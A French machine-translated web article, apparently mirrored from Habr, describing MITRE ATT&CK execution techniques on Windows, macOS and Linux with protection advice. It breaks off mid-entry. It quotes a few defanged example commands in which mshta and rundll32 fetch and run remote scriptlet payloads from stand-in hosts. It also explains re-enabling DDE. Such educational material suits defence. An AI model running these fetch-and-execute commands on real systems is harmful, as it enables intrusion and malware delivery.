<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🙎🏾 👩🏾‍🔬 🥋 Apprenez les tactiques, techniques et connaissances communes contradictoires (ATT @ CK). Tactiques d'entreprise. 2e partie 👩🏻‍🔬 🤟🏾 👩🏾‍🤝‍👩🏽</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Exécution 
 Liens vers toutes les parties: 
 Partie 1. Obtention de l'accès initial (accès initial) 
 Partie 2. Exécution 
 Partie 3. Fixation (persis...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Apprenez les tactiques, techniques et connaissances communes contradictoires (ATT @ CK). Tactiques d'entreprise. 2e partie</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/424027/"><h1>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Exécution</a> </h1><br>  <b>Liens vers toutes les parties:</b> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1. Obtention de l'accès initial (accès initial)</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2. Exécution</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 3. Fixation (persistance)</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 4. Escalade de privilèges</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 5. Évasion de la défense</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 6. Obtention des informations d'identification (accès aux informations d'identification)</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 7. Découverte</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 8. Mouvement latéral</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 9. Collecte de données (collecte)</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 10 Exfiltration</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 11. Commandement et contrôle</a> <br><br>  La phase «Exécution» décrit l'utilisation par les attaquants des moyens et méthodes d'exécution à distance et locale dans le système attaqué des différentes commandes, scripts et fichiers exécutables qui lui ont été livrés à l'étape précédente. <br><a name="habracut"></a><br>  <i>L'auteur n'est pas responsable des conséquences possibles de l'application des informations énoncées dans l'article, et s'excuse également pour d'éventuelles inexactitudes faites dans certaines formulations et termes.</i>  <i>Les informations publiées sont une nouvelle version gratuite du contenu de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">MITRE ATT &amp; CK.</a></i> <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">AppleScript</a> </h3><br>  <i>Système:</i> macOS <br>  <i>Droits:</i> utilisateur <br>  <i>Description:</i> le langage AppleScript a la capacité de fonctionner avec Apple Event - messages échangés entre les applications dans le cadre de la communication interprocessus (IPC).  En utilisant Apple Event, vous pouvez interagir avec presque toutes les applications ouvertes localement ou à distance, déclencher des événements tels que l'ouverture de fenêtres et la pression de touches.  Les scripts sont exécutés à l'aide de la commande: <i>Osascript -e &lt;script&gt;</i> . <br>  Les attaquants peuvent utiliser AppleScript pour ouvrir secrètement des connexions SSH à des hôtes distants, donnant ainsi aux utilisateurs de fausses dialogues.  AppleScript peut également être utilisé dans des types d'attaques plus courants, tels que les organisations Reverse Shell. <br><br>  <i>Recommandations de protection:</i> vérification obligatoire des scripts AppleScript en cours d'exécution pour la signature d'un développeur de confiance. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">CMSTP</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">(AppLocker ByPass - CMSTP)</a> </h3><br>  <i>Système:</i> Windows <br>  <i>Droits:</i> utilisateur <br>  <i>Description:</i> <i>Microsoft Connection Manager Profile Installer (cmstp.exe)</i> est l'utilitaire " <i>Connection Manager Profile Installer</i> " intégré à Windows.  Cmstp.exe peut prendre un fichier inf comme paramètre, donc un attaquant pourrait préparer un INF malveillant spécial pour télécharger et exécuter des DLL ou des scriptlets (* .sct) à partir de serveurs distants contournant AppLocker et d'autres verrous, car cmstp.exe est signé avec un certificat numérique Microsoft. <br><br>  <i>Recommandations de protection:</i> bloquer le lancement d'applications potentiellement dangereuses.  Surveillance des startups <i>C: \ Windows \ System32 \ cmstp.exe</i> . <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Interface de ligne de commande</a> </h3><br>  <i>Système:</i> Windows, Linux, macOS <br>  <i>Droits:</i> utilisateur, administrateur, système <br>  <i>Description: Vous</i> pouvez interagir avec l'interface de ligne de commande localement, à distance via un logiciel d'accès à distance, en utilisant Reverse Shell, etc.  Les commandes sont exécutées avec le niveau d'autorisation actuel du processus d'interface de ligne de commande, si la commande n'inclut pas d'appel au processus qui modifie les autorisations pour exécuter la commande (par exemple, une tâche planifiée). <br><br>  <i>Recommandations de sécurité:</i> auditez et / ou verrouillez la ligne de commande à l'aide d'outils tels que AppLocker ou des politiques de restriction logicielle. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Éléments du panneau de commande</a> </h3><br>  <i>Système:</i> Windows <br>  <i>Droits:</i> utilisateur, administrateur, système <br>  <i>Description:</i> la tactique consiste à utiliser les éléments du Panneau de configuration Windows par des attaquants pour exécuter des commandes arbitraires en tant que charge utile (par exemple, le virus <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Reaver</a></i> ).  Les objets malveillants peuvent être déguisés en contrôles standard et transmis au système à l'aide de pièces jointes de phishing.  Les utilitaires de visualisation et de configuration des paramètres Windows sont des fichiers exe enregistrés et des fichiers CPL des éléments du panneau de configuration Windows.  Les fichiers CPL sont en fait des DLL renommés qui peuvent être exécutés des manières suivantes: <br><ul><li>  directement à partir de la ligne de commande: <i>control.exe <b>&lt;file.cpl&gt;</b></i> ; </li><li>  à l'aide des fonctions API de shell32.dll: <i>rundll32.exe shell32.dll, Control_RunDLL <b>&lt;file.cpl&gt;</b></i> ; </li><li>  double-cliquez sur le fichier cpl. </li></ul><br>  Les CPL enregistrés stockés dans System32 sont automatiquement affichés dans le Panneau de configuration de Windows et ont un identifiant unique stocké dans le registre: <br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Explorer \ ControlPanel \ NameSpace</i> <br><br>  Les informations sur les autres CPL, par exemple, le nom d'affichage et le chemin d'accès au fichier cpl, sont stockées dans les <i>sections Cpls</i> et <i>Propriétés étendues</i> de la section: <br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Control Panel</i> <br><br>  Certains CPL lancés via le shell sont enregistrés dans la section: <br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Controls Folder \ <b>{name}</b> \ shellex \ PropertySheetHandlers</i> <br><br>  <i>Recommandation de protection:</i> restreignez le lancement et le stockage des fichiers d'éléments du panneau de configuration uniquement dans des dossiers protégés (par exemple, <i>C: \ Windows \ System32</i> ), activez le contrôle de compte d'utilisateur (UAC) et AppLocker pour empêcher les modifications non autorisées du système.  Bien sûr, l'utilisation d'un logiciel antivirus. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Protocole dynamique d'échange de données (DDE),</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">code macro sans macro dans MSWord</a> </h3><br>  <i>Système:</i> Windows <br>  <i>Droits:</i> utilisateur <br>  <i>Description:</i> DDE est un protocole pour l'interaction des applications qui partagent des données et de la mémoire partagée pour la messagerie.  Par exemple, un document Word peut contenir un tableau qui est automatiquement mis à jour à partir d'un document Excel.  La technique consiste à exploiter une vulnérabilité dans les applications MS Office liée à l'utilisation du protocole DDE dans MS Office.  Les attaquants peuvent incorporer des objets dans des documents MS Office contenant des commandes qui seront exécutées à l'ouverture du document.  Par exemple, un document Word peut contenir un objet Field dont la valeur indique la commande <i>{</i> commande <i>DDEAUTO &lt;, par exemple, c: \ windows \ system32 \ cmd.exe&gt;}</i> , qui sera exécutée à l'ouverture du document.  Malgré la perte de pertinence, DDE peut être activé, y compris dans Windows 10 et MS Office 2016, à l'aide de la clé: <br>  <i>AllowDDE (DWORD)</i> = 2 dans la clé de registre: <br>  <i>HKEY_CURRENT_USER \ Software \ Microsoft \ Office \ <b>&lt;version d'Office&gt;</b> \ Word \ Security</i> . <br><br>  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Recommandations de</a></i> <i>protection:</i> suivez les <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">recommandations de Microsoft</a></i> et installez la <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">mise à jour MS Office</a></i> appropriée.  Dans Windows 10, vous pouvez également activer le paramètre <i>Attack Surface Reduction (ASR)</i> pour vous protéger contre les attaques DDE et les processus enfants par les applications MS Office. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Exécution via API</a> </h3><br>  <i>Système:</i> Windows <br>  <i>Droits:</i> utilisateur, administrateur, système <br>  <i>Description: les</i> attaquants peuvent utiliser l'API pour exécuter des fichiers binaires.  Les fonctions API telles que CreateProcess permettent aux programmes et aux scripts de démarrer des processus en spécifiant les chemins d'accès et les arguments nécessaires.  Fonctions API pouvant être utilisées pour exécuter des fichiers binaires: <br><ul><li>  CreateProcessA (), CreateProcessW (); </li><li>  CreateProcessAsUserA (), CreateProcessAsUserW (); </li><li>  CreateProcessInternalA (), CreateProcessInternalW (); </li><li>  CreateProcessWithLogonW (), CreateProcessWithTokenW (); </li><li>  LoadLibraryA (), LoadLibraryW (); </li><li>  LoadLibraryExA (), LoadLibraryExW (); </li><li>  LoadModule (); </li><li>  LoadPackagedLibrary (); </li><li>  WinExec (); </li><li>  ShellExecuteA (), ShellExecuteW (); </li><li>  ShellExecuteExA (), ShellExecuteExW (). </li></ul><br><br>  <i>Recommandations de protection:</i> les appels de fonction API sont un phénomène courant difficile à distinguer des activités malveillantes.  Le vecteur de protection doit viser à empêcher le lancement des outils de l'attaquant au début de la chaîne d'attaque, à détecter les comportements malveillants et à bloquer les logiciels potentiellement dangereux. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Exécution par chargement de module</a> </h3><br>  <i>Système:</i> Windows <br>  <i>Droits:</i> utilisateur <br>  <i>Description:</i> Il est possible d'organiser l'exécution de code à l'aide du chargeur de module Windows - NTDLL.dll, qui peut charger la bibliothèque DLL sur un chemin local ou réseau arbitraire.  NTDLL.dll fait partie de l'API Windows et peut appeler des fonctions telles que <i>CreateProcess ()</i> et <i>LoadLibrary ()</i> . <br><br>  <i>Recommandations de protection:</i> les appels de fonction API sont des fonctionnalités normales du système d'exploitation difficiles à distinguer des activités malveillantes.  Le vecteur de protection doit viser à empêcher le lancement des outils de l'attaquant au début de la chaîne d'attaque.  il est judicieux d'envisager de limiter le chargement des DLL aux <i>répertoires% SystemRoot%</i> et <i>% ProgramFiles%</i> . <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Exploitation pour l'exécution client</a> </h3><br>  <i>Système:</i> Windows, Linux, macOS <br>  <i>Droits:</i> utilisateur <br>  <i>Description: La</i> technique implique l'exécution de code à distance en utilisant des exploits dans les logiciels utilisateur.  La présence de vulnérabilités dans les logiciels est souvent associée à une violation par les développeurs de logiciels des exigences d'une programmation sûre, ce qui conduit finalement à la possibilité de provoquer un comportement inattendu du logiciel. <br>  Considérez certains types d'exploits: <br><ul><li>  Exploits du navigateur.  Les navigateurs Web sont la cible lorsque les attaquants utilisent des liens de chargement instantané et de phishing.  Le système attaqué peut être compromis via un navigateur normal après que l'utilisateur a effectué certaines actions, par exemple en suivant le lien spécifié dans l'e-mail de phishing. </li><li>  Exploits d'applications Office.  Les fichiers malveillants sont transmis sous forme de pièces jointes ou de liens de téléchargement.  Pour exploiter la vulnérabilité, l'utilisateur doit ouvrir un document ou un fichier pour lancer l'exploit. </li><li>  Exploitations d'applications tierces.  Les applications courantes, telles qu'Adobe Reader et Flash, souvent utilisées dans les environnements d'entreprise, sont ciblées par les cybercriminels.  Selon le logiciel et la nature de la vulnérabilité, les vulnérabilités sont exploitées dans un navigateur ou lorsqu'un utilisateur ouvre un fichier, par exemple, des objets Flash peuvent être livrés dans des documents MS Office. </li></ul><br><br>  <i>Recommandations de protection:</i> installation en temps opportun des mises à jour pour les applications utilisées.  L'utilisation de divers moyens d'isolement des applications potentiellement vulnérables - bacs à sable, outils de microsegmentation et de virtualisation, par exemple, <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Sandboxie</a></i> pour Windows et Apparmor, Docker pour Linux.  Des systèmes de protection contre les <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">exploits</a></i> tels que <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Windows Defender Exploit Guard (WDEG)</a></i> pour Windows 10 ou <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Enhanced Mitigation Experience Toolkit (EMET)</a> pour les versions antérieures de Windows sont également recommandés. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Interface utilisateur graphique</a> </h3><br>  <i>Système:</i> Windows, Linux, macOS <br>  Droits: utilisateur, administrateur, système <br>  <i>Description: un</i> fichier exécutable ou un script est lancé lors de l'interaction avec un fichier via une interface utilisateur graphique (GUI) dans une session interactive ou distante, par exemple, via le protocole RDP. <br><br>  Conseils de <i>sécurité:</i> protégez les informations d'identification qui peuvent être utilisées pour se connecter à distance au système.  Identifiez les utilitaires système inutiles, les logiciels tiers qui peuvent être utilisés pour entrer en mode distant interactif. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">InstallUtil</a> </h3><br>  <i>Système:</i> Windows <br>  <i>Droits:</i> utilisateur <br>  <i>Description:</i> InstallUtil est un utilitaire de ligne de commande Windows qui peut installer et désinstaller des applications conformes aux spécifications du .NET Framework.  Installutil est automatiquement installé avec VisualStudio.  Le fichier InstallUtil.exe est signé par un certificat Microsoft et est stocké dans: <br>  <i>C: \ Windows \ Microsoft.NET \ Framework \ v [version] \ InstallUtil.exe</i> <br>  Les attaquants peuvent utiliser la fonctionnalité InstallUtil pour exécuter le code proxy et contourner les listes blanches des applications. <br><br>  <i>Recommandations de protection:</i> Il est possible qu'InstallUtil ne soit pas utilisé sur votre système, pensez donc à bloquer l'installation d'InstallUtil.exe. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Pilotes LSASS (Pilote LSASS)</a> </h3><br>  <i>Système:</i> Windows <br>  <i>Droits:</i> administrateur, système <br>  <i>Description:</i> Local Security Authority (LSA) est un sous-système Windows qui fournit l'authentification des utilisateurs.  Le LSA inclut plusieurs DLL interconnectées dynamiques qui s'exécutent dans le processus LSASS.exe.  Les attaquants peuvent attaquer LSASS.exe en remplaçant ou en ajoutant des pilotes LSA illégitimes, puis en exécutant du code arbitraire.  La technique est implémentée dans les logiciels malveillants Pasam et Wingbird, qui «lancent» les DLL modifiées utilisées pour charger LSASS.  Dans ce cas, le code malveillant est exécuté avant que la DLL illégitime provoque un crash et un crash de service LSASS ultérieur. <br><br>  <i>Recommandations de protection:</i> dans Windows 8.1 et Windows Server 2012 R2, activez la protection LSA en définissant la clé de registre: <br>  <i>HKEY_LOCAL_MACHINE \ SYSTEM \ CurrentControlSet \ Control \ Lsa \ RunAsPPL</i> <br>  à la valeur <i>dword: 00000001</i> <br><br>  Cette protection garantit que les plug-ins et pilotes chargés par LSA sont signés numériquement par Microsoft.  Dans Windows 10 et Server 2016, activez <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Windows Defender Credential Guard</a></i> pour exécuter lsass.exe dans un environnement virtuel isolé.  Activez le mode de recherche de DLL sécurisé pour réduire le risque de chargement de bibliothèques malveillantes dans lsass.exe: <br>  <i>HKEY_LOCAL_MACHINE \ System \ CurrentControlSet \ Control \ Session Manager \ SafeDllSearchMode</i> . <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Launchctl</a> </h3><br>  <i>Système:</i> macOS <br>  <i>Droits:</i> utilisateur, administrateur <br>  <i>Description:</i> Launchctl - un utilitaire pour gérer le service Launchd.  À l'aide de Launchctl, vous pouvez gérer les services système et utilisateur (LaunchDeamons et LaunchAgents), ainsi qu'exécuter des commandes et des programmes.  Launchctl prend en charge les sous-commandes de ligne de commande, interactives ou redirigées à partir de l'entrée standard: <br>  <i>launchctl submit -l [nom_étiquette] - / Chemin / vers / chose / vers / exécuter '' arg "'' arg" '' arg "</i> . <br>  En démarrant et en redémarrant les services et les démons, les attaquants peuvent exécuter du code et même contourner la liste blanche si launchctl est un processus autorisé, cependant le chargement, le déchargement et le redémarrage des services et des démons peuvent nécessiter des privilèges élevés. <br><br>  <i>Recommandations de sécurité:</i> limitation des droits des utilisateurs pour créer des agents de lancement et lancer des démons de lancement à l'aide de la stratégie de groupe.  En utilisant l'application <i>KnockKnock</i> , <i>vous</i> pouvez découvrir des programmes qui utilisent launchctl pour gérer les agents de lancement et les démons de lancement. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Exécution avec la planification des travaux locaux</a> </h3><br>  <i>Système:</i> Linux, macOS <br>  <i>Droits:</i> utilisateur, administrateur, root <br>  <i>Description: les</i> attaquants peuvent créer des tâches dans les systèmes attaqués pour le lancement non autorisé de programmes au démarrage du système ou selon un calendrier.  Les systèmes Linux et Apple prennent en charge plusieurs méthodes pour planifier le lancement de tâches d'arrière-plan périodiques: cron, at, launchd.  Contrairement au planificateur de tâches Windows, la planification des tâches sur les systèmes Linux ne peut pas être effectuée à distance, sauf pour l'utilisation de sessions distantes comme SSH. <br><br>  <i>Recommandations de protection:</i> limitation des droits des utilisateurs pour créer des tâches planifiées, blocage des utilitaires système et autres logiciels pouvant être utilisés pour planifier des tâches. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Mshta</a> </h3><br>  <i>Système:</i> Windows <br>  <i>Droits:</i> utilisateur <br>  <i>Description:</i> Mshta.exe (situé dans <i>C: \ Windows \ System32 \</i> ) est un utilitaire qui exécute des applications HTML Microsoft (* .HTA).  Les applications HTA fonctionnent avec les mêmes technologies qu'InternetExplorer, mais en dehors du navigateur.  Étant donné que Mshta traite les fichiers en contournant les paramètres de sécurité du navigateur, les attaquants peuvent utiliser mshta.exe pour proxy l'exécution de fichiers HTA malveillants, Javascript ou VBScript.  Le fichier malveillant peut être lancé via le script intégré: <br>  <i>mshta vbscript: Close (Execute (script "GetObject (" ": https [:] // webserver / payload [.] sct" ")"))))</i> <br><br>  ou directement, à l'URL: <br>  <i>mshta http [:] // webserver / payload [.] hta</i> <br><br>  <i>Recommandations de protection: la</i> fonctionnalité de mshta.exe est associée aux anciennes versions d'IE qui ont atteint la fin de leur cycle de vie.  Bloquer Mshta.exe si vous n'utilisez pas ses fonctionnalités. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Powerhell</a> </h3><br>  <i>Système:</i> Windows <br>  <i>Droits:</i> utilisateur, administrateur <br>  <i>Description:</i> PowerShell (PS) est une puissante interface de ligne de commande interactive et un environnement de script inclus avec Windows.  Les attaquants peuvent utiliser PS pour collecter des informations et exécuter du code.  Par exemple, la cmdlet Start-Process peut exécuter un fichier exécutable; la cmdlet Invoke-Command exécutera la commande localement ou sur un ordinateur distant.  PS peut également être utilisé pour télécharger et exécuter des fichiers exécutables à partir d'Internet, sans les enregistrer sur votre disque dur.  Pour les connexions à distance utilisant PS, vous avez besoin des droits d'administrateur.  Il existe un certain nombre d'outils pour attaquer PS: <br><ul><li>  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Empire</a></i> </li><li>  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Powersploit</a></i> </li><li>  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">PSAttack</a></i> </li></ul><br>  <i>Recommandations de protection:</i> PS peut être supprimé du système s'il n'est pas nécessaire.  Si PS est requis, les administrateurs doivent se limiter à l'exécuter uniquement en exécutant des scripts signés.  Désactivez le service WinRM pour empêcher l'exécution à distance des scripts PS.  Il convient de noter qu'il existe des <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">méthodes pour contourner les politiques d'exécution de script PS</a> . <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Regsvcs / regasm</a> </h3><br>  <i>Système:</i> Windows <br>  <i>Droits:</i> utilisateur, administrateur <br>  <i>Description:</i> Regsvcs et Regasm sont des utilitaires d'utilitaires Windows utilisés pour s'enregistrer auprès du système d'assemblage COM (Object Object Model) .NET.  Les deux fichiers sont signés numériquement par Microsoft.  Les attaquants peuvent utiliser Regsvcs et Regasm pour exécuter le code proxy lorsque l'attribut est le code qui doit être exécuté avant l'enregistrement ou la désinscription: [ComRegisterFunction] ou [ComUnregisterFunction].  Le code avec de tels attributs peut être lancé même si le processus s'exécute avec des privilèges insuffisants ou même se bloque au démarrage. <br><br>  <i>Recommandations de protection:</i> bloquez Regsvcs.exe et Regasm.exe s'ils ne sont pas utilisés sur votre système ou réseau. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Regsvr32</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">(Squiblydoo)</a> </h3><br>  <i>Système:</i> Windows <br>  <i>Droits:</i> utilisateur, administrateur <br>  <i>Description:</i> Regsvr32.exe est un utilitaire de console pour l'enregistrement et l'annulation de l'enregistrement des contrôles OLE, tels que ActiveX et DLL, dans le Registre.  Regsvr32.exe est signé numériquement par Microsoft et peut être utilisé pour exécuter du code proxy.  Par exemple, en utilisant Regsvr32, vous pouvez télécharger un fichier XML contenant des morceaux de code Java (scriptlets) qui contourneront la liste blanche. <br><br>  <i>Recommandations de protection:</i> Attack Surface Reduction (ASR) dans EMET et Advanced Theart Protection dans Windows Defender peuvent bloquer l'utilisation de Regsvr32.exe pour contourner les listes blanches. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Rundll32</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">(Poweliks)</a> </h3><br>  <i>Système:</i> Windows <br>  <i>Droits:</i> utilisateur <br>  <i>Description:</i> Rundll32.exe est un utilitaire système pour lancer des programmes situés dans des bibliothèques connectées dynamiquement, il peut être appelé pour proxy le fichier binaire, exécuter des fichiers de contrôle Windows (.cpl) via les fonctions Shel32.dll non documentées - <i>Control_RunDLL</i> et <i>Control_RunDLLAsUser</i> .  Un double-clic sur le fichier .cpl entraîne également l'exécution de Rundll32.exe.  Rundll32 peut également être utilisé pour exécuter des scripts tels que JavaScript: <br>  <i>rundll32.exe javascript: "\ .. \ mshtml, RunHTMLApplication"; document.write (); GetObject ("scrirpt: https [:] // www [.] exemple [.] com / malveillant.sct") "</i> <br>  La méthode ci-dessus d'utilisation de rundll32.exe est détectée par un logiciel antivirus comme un virus comme Poweliks. <br>  Recommandations de protection: Attack Surface Reduction (ASR) dans EMET et Advanced Theart Protection dans Windows Defender peuvent bloquer l'utilisation de Rundll32.exe pour contourner la liste blanche. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Exécution d'une tâche planifiée Windows</a> </h3><br>  <i>Système:</i> Windows <br>  <i>Droits:</i> utilisateur, administrateur, système <br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description: des</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> utilitaires tels que at, schtasks et Windows Task 